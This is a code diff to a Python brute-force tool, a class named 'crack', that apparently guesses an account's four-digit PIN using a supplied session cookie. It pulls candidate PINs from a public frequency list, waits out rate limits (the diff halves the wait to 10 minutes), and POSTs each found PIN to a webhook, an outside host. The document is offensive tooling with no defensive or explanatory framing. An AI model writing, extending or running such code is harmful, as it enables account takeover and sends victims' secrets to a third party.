@@ -117,6 +117,7 @@ class crack:
       clear()
       self.check()
     self.cookie = cookie
+    self.webhook = webhook
     self.continueProgress = continueProgress
   # --({ Start Cracker }) -- #
   def start(self):
@@ -189,7 +190,7 @@ class crack:
         time.sleep(4)
         clear()
         self.check()
-      pins = [pin[0:pin.index(",")] for pin in requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/four-digit-pin-codes-sorted-by-frequency-withcount.csv").text.splitlines()][startingLine:9999]
+      pins = [pin[0:pin.index(",")] for pin in requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/four-digit-pin-codes-sorted-by-frequency-withcount.csv").text.splitlines()][startingLine:9998]
     else:
       startingLine = 0
       pins = [pin[0:pin.index(",")] for pin in requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/four-digit-pin-codes-sorted-by-frequency-withcount.csv").text.splitlines()]
@@ -220,17 +221,13 @@ class crack:
             cprint(" BRUTEFORCER ", "green", end="")
             print("] " , end="")
             cprint(f"Pin found: {pin}", 'green')
-            r = requests.post(webhook, data={'content':pin})
+            r = requests.post(self.webhook, data={'content':pin})
             if not r.status_code ==200:
               print("[", end="")
               cprint("ERROR", end="")
               print("] " , end="")
               cprint('Invalid Webhook', 'red')
-            print("[", end="")
-            cprint(" BRUTEFORCER ", "magenta", end="")
-            print("] " , end="")
-            cprint("Press enter to continue...", 'red')
-            input("> ")
+            os.system("PAUSE")
           if response['errors'][0]['code'] == 4:
             print("[", end="")
             cprint(" BRUTEFORCER ", "magenta", end="")
@@ -240,8 +237,8 @@ class crack:
             print("[", end="")
             cprint(" RATELIMIT ", "yellow", end="")
             print("] " , end="")
-            cprint(f'Too many requests. Waiting 21 minutes before resumimg', 'yellow')
-            time.sleep(1260)
+            cprint(f'Too many requests. Waiting 10 minutes before resumimg', 'yellow')
+            time.sleep(600)
           if response['errors'][0]['message'] == 'Authorization has been denied for this request.':
             print("[", end="")
             cprint(" ERROR ", "red", end="")
